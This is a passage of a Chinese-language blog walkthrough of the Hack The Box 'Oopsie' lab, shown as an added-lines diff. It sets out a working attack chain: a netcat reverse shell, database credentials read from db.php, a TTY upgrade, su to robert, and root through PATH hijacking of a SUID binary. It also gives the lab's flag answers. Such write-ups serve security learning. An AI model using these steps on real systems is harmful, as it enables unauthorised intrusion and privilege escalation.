+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.102<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.95.191<span class="o">]</span> <span class="m">48598</span>
+</span></span><span class="line"><span class="cl">Linux oopsie 4.15.0-76-generic <span class="c1">#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 14:10:01 up <span class="m">41</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就找包含 robert 用户密码的文件。</p>
+<p>思路就是看 Web 的源码，<code>db.php</code> 这名字一看就是存数据或者连数据库的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">pwd</span>   
+</span></span><span class="line"><span class="cl">/var/www/html/cdn-cgi/login
+</span></span><span class="line"><span class="cl">$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2021</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">6361</span> Apr <span class="m">15</span>  <span class="m">2021</span> admin.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">80</span> Jan <span class="m">24</span>  <span class="m">2020</span> db.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">5349</span> Apr <span class="m">15</span>  <span class="m">2021</span> index.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root    <span class="m">0</span> Jan <span class="m">24</span>  <span class="m">2020</span> script.js
+</span></span><span class="line"><span class="cl">$ cat db.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> mysqli_connect<span class="o">(</span><span class="s1">&#39;localhost&#39;</span>,<span class="s1">&#39;robert&#39;</span>,<span class="s1">&#39;M3g4C0rpUs3r!&#39;</span>,<span class="s1">&#39;garage&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：db.php</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>What executible is run with the option &ldquo;-group bugtracker&rdquo; to identify all files owned by the bugtracker group?</p>
+<p>使用“-group bugtracker”选项运行哪个可执行文件，以识别 bugtracker 组拥有的所有文件？</p>
+</blockquote>
+<p>使用 <code>find / -group bugtracker 2&gt;/dev/null</code> 就可以查看 bugtracker 组的文件。</p>
+<p>但是我们当前是 <code>www-data</code> 用户，不属于这个组，有些这个组的目录进不去，所以先 su 到 robert 看看他是不是这个组的。</p>
+<p>升级 Shell 为 TTY：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">www-data@oopsie:/var/www/html/cdn-cgi/login$ ^Z      
+</span></span><span class="line"><span class="cl">zsh: suspended  nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Oopsie<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + continued  nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">                               <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">www-data@oopsie:/var/www/html/cdn-cgi/login$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就可以用 <code>su</code> 切换用户了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@oopsie:/var/www/html/cdn-cgi/login$ su - robert   
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span>,1001<span class="o">(</span>bugtracker<span class="o">)</span>
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ find / -group bugtracker 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/bugtracker
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：find</strong></p>
+<h3 id="task-8">Task 8
+</h3><blockquote>
+<p>Regardless of which user starts running the bugtracker executable, what&rsquo;s user privileges will use to run?</p>
+<p>无论哪个用户启动 bugtracker 可执行文件，运行该程序将使用什么用户权限？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robert@oopsie:~$ ls -l /usr/bin/bugtracker
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root bugtracker <span class="m">8792</span> Jan <span class="m">25</span>  <span class="m">2020</span> /usr/bin/bugtracker
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们看到属主执行位是 <code>s</code>，也就是 SUID。</p>
+<p>意思是，运行这个程序的时候，进程身份临时变成【文件属主】，而不是当前执行用户。</p>
+<p><strong>答案：root</strong></p>
+<h3 id="task-9">Task 9
+</h3><blockquote>
+<p>What SUID stands for?</p>
+<p>SUID是什么的缩写？</p>
+</blockquote>
+<p><strong>答案：Set owner User ID</strong></p>
+<h3 id="task-10">Task 10
+</h3><blockquote>
+<p>What is the name of the executable being called in an insecure manner?</p>
+<p>以不安全方式调用的可执行文件的名称是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span><span class="lnt">98
+</span><span class="lnt">99
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robert@oopsie:~$ strings /usr/bin/bugtracker
+</span></span><span class="line"><span class="cl">/lib64/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">libc.so.6
+</span></span><span class="line"><span class="cl">setuid
+</span></span><span class="line"><span class="cl">strcpy
+</span></span><span class="line"><span class="cl">__isoc99_scanf
+</span></span><span class="line"><span class="cl">__stack_chk_fail
+</span></span><span class="line"><span class="cl">putchar
+</span></span><span class="line"><span class="cl"><span class="nb">printf</span>
+</span></span><span class="line"><span class="cl">strlen
+</span></span><span class="line"><span class="cl">malloc
+</span></span><span class="line"><span class="cl">strcat
+</span></span><span class="line"><span class="cl">system
+</span></span><span class="line"><span class="cl">geteuid
+</span></span><span class="line"><span class="cl">__cxa_finalize
+</span></span><span class="line"><span class="cl">__libc_start_main
+</span></span><span class="line"><span class="cl">GLIBC_2.7
+</span></span><span class="line"><span class="cl">GLIBC_2.4
+</span></span><span class="line"><span class="cl">GLIBC_2.2.5
+</span></span><span class="line"><span class="cl">_ITM_deregisterTMCloneTable
+</span></span><span class="line"><span class="cl">__gmon_start__
+</span></span><span class="line"><span class="cl">_ITM_registerTMCloneTable
+</span></span><span class="line"><span class="cl">AWAVI
+</span></span><span class="line"><span class="cl">AUATL
+</span></span><span class="line"><span class="cl"><span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
+</span></span><span class="line"><span class="cl">------------------
+</span></span><span class="line"><span class="cl">: EV Bug Tracker :
+</span></span><span class="line"><span class="cl">------------------
+</span></span><span class="line"><span class="cl">Provide Bug ID: 
+</span></span><span class="line"><span class="cl">---------------
+</span></span><span class="line"><span class="cl">cat /root/reports/
+</span></span><span class="line"><span class="cl"><span class="p">;</span>*3$<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">crtstuff.c
+</span></span></span><span class="line"><span class="cl"><span class="s2">deregister_tm_clones
+</span></span></span><span class="line"><span class="cl"><span class="s2">__do_global_dtors_aux
+</span></span></span><span class="line"><span class="cl"><span class="s2">completed.7697
+</span></span></span><span class="line"><span class="cl"><span class="s2">__do_global_dtors_aux_fini_array_entry
+</span></span></span><span class="line"><span class="cl"><span class="s2">frame_dummy
+</span></span></span><span class="line"><span class="cl"><span class="s2">__frame_dummy_init_array_entry
+</span></span></span><span class="line"><span class="cl"><span class="s2">test.c
+</span></span></span><span class="line"><span class="cl"><span class="s2">__FRAME_END__
+</span></span></span><span class="line"><span class="cl"><span class="s2">__init_array_end
+</span></span></span><span class="line"><span class="cl"><span class="s2">_DYNAMIC
+</span></span></span><span class="line"><span class="cl"><span class="s2">__init_array_start
+</span></span></span><span class="line"><span class="cl"><span class="s2">__GNU_EH_FRAME_HDR
+</span></span></span><span class="line"><span class="cl"><span class="s2">_GLOBAL_OFFSET_TABLE_
+</span></span></span><span class="line"><span class="cl"><span class="s2">__libc_csu_fini
+</span></span></span><span class="line"><span class="cl"><span class="s2">putchar@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">_ITM_deregisterTMCloneTable
+</span></span></span><span class="line"><span class="cl"><span class="s2">strcpy@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">_edata
+</span></span></span><span class="line"><span class="cl"><span class="s2">strlen@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">__stack_chk_fail@@GLIBC_2.4
+</span></span></span><span class="line"><span class="cl"><span class="s2">system@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">printf@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">concat
+</span></span></span><span class="line"><span class="cl"><span class="s2">geteuid@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">__libc_start_main@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">__data_start
+</span></span></span><span class="line"><span class="cl"><span class="s2">__gmon_start__
+</span></span></span><span class="line"><span class="cl"><span class="s2">__dso_handle
+</span></span></span><span class="line"><span class="cl"><span class="s2">_IO_stdin_used
+</span></span></span><span class="line"><span class="cl"><span class="s2">__libc_csu_init
+</span></span></span><span class="line"><span class="cl"><span class="s2">malloc@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">__bss_start
+</span></span></span><span class="line"><span class="cl"><span class="s2">main
+</span></span></span><span class="line"><span class="cl"><span class="s2">__isoc99_scanf@@GLIBC_2.7
+</span></span></span><span class="line"><span class="cl"><span class="s2">strcat@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">__TMC_END__
+</span></span></span><span class="line"><span class="cl"><span class="s2">_ITM_registerTMCloneTable
+</span></span></span><span class="line"><span class="cl"><span class="s2">setuid@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">__cxa_finalize@@GLIBC_2.2.5
+</span></span></span><span class="line"><span class="cl"><span class="s2">.symtab
+</span></span></span><span class="line"><span class="cl"><span class="s2">.strtab
+</span></span></span><span class="line"><span class="cl"><span class="s2">.shstrtab
+</span></span></span><span class="line"><span class="cl"><span class="s2">.interp
+</span></span></span><span class="line"><span class="cl"><span class="s2">.note.ABI-tag
+</span></span></span><span class="line"><span class="cl"><span class="s2">.note.gnu.build-id
+</span></span></span><span class="line"><span class="cl"><span class="s2">.gnu.hash
+</span></span></span><span class="line"><span class="cl"><span class="s2">.dynsym
+</span></span></span><span class="line"><span class="cl"><span class="s2">.dynstr
+</span></span></span><span class="line"><span class="cl"><span class="s2">.gnu.version
+</span></span></span><span class="line"><span class="cl"><span class="s2">.gnu.version_r
+</span></span></span><span class="line"><span class="cl"><span class="s2">.rela.dyn
+</span></span></span><span class="line"><span class="cl"><span class="s2">.rela.plt
+</span></span></span><span class="line"><span class="cl"><span class="s2">.init
+</span></span></span><span class="line"><span class="cl"><span class="s2">.plt.got
+</span></span></span><span class="line"><span class="cl"><span class="s2">.text
+</span></span></span><span class="line"><span class="cl"><span class="s2">.fini
+</span></span></span><span class="line"><span class="cl"><span class="s2">.rodata
+</span></span></span><span class="line"><span class="cl"><span class="s2">.eh_frame_hdr
+</span></span></span><span class="line"><span class="cl"><span class="s2">.eh_frame
+</span></span></span><span class="line"><span class="cl"><span class="s2">.init_array
+</span></span></span><span class="line"><span class="cl"><span class="s2">.fini_array
+</span></span></span><span class="line"><span class="cl"><span class="s2">.dynamic
+</span></span></span><span class="line"><span class="cl"><span class="s2">.data
+</span></span></span><span class="line"><span class="cl"><span class="s2">.bss
+</span></span></span><span class="line"><span class="cl"><span class="s2">.comment
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到了 <code>cat /root/reports/</code> 字样。</p>
+<p><strong>答案：cat</strong></p>
+<h3 id="submit-user-flag">Submit User Flag
+</h3><blockquote>
+<p>Submit the flag located in the robert user&rsquo;s home directory.</p>
+<p>提交位于 robert 用户主目录中的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robert@oopsie:~$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/robert
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ cat user.txt
+</span></span><span class="line"><span class="cl">f2c74ee8db7983851ab2a96a44eb7981
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：f2c74ee8db7983851ab2a96a44eb7981</strong></p>
+<h3 id="submit-root-flag">Submit Root Flag
+</h3><blockquote>
+<p>Submit the flag located in root&rsquo;s home directory.</p>
+<p>提交位于 root 用户主目录中的 flag。</p>
+</blockquote>
+<p>PATH 劫持。
+PATH 是 Linux 的环境变量，系统在执行一条不带绝对路径的命令时，会按照 PATH 里冒号分隔的目录顺序依次查找可执行文件，找到第一个同名程序就执行它。
+PATH 劫持（PATH Hijacking）本质：<strong>把我们可控的目录放到 PATH 靠前位置，放一个和目标命令同名的恶意程序，用户 / 脚本调用这个命令时，优先跑我们的恶意文件</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robert@oopsie:~$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/cat
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ chmod +x /tmp/cat
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ /usr/bin/bugtracker 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------------------
+</span></span><span class="line"><span class="cl">: EV Bug Tracker :
+</span></span><span class="line"><span class="cl">------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Provide Bug ID: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">---------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@oopsie:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span>,1001<span class="o">(</span>bugtracker<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@oopsie:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span>,1001<span class="o">(</span>bugtracker<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@oopsie:~# ls -l /root
+</span></span><span class="line"><span class="cl">total <span class="m">8</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Jul <span class="m">28</span>  <span class="m">2021</span> reports
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root   <span class="m">33</span> Feb <span class="m">25</span>  <span class="m">2020</span> root.txt
+</span></span><span class="line"><span class="cl">root@oopsie:~# /bin/cat /root/root.txt
+</span></span><span class="line"><span class="cl">af13b0bee69f8a877c3faf667f7beacf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>export PATH=/tmp:$PATH</code> 意思是把 <code>/tmp</code> 插到 PATH 列表最前面。</p>
+<p><strong>答案：af13b0bee69f8a877c3faf667f7beacf</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/">
+        
+        
+            <div class="article-image">
+                <img src="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/assets/image-20261104205444073.d9e4fd976e03998d17a7cc2012db183c_hu3527743922139951764.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB Starting Point 入门系列"
+                        
+                        data-hash="md5-2eT9l24DmY0Xp8wgEtsYPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Starting Point 入门系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
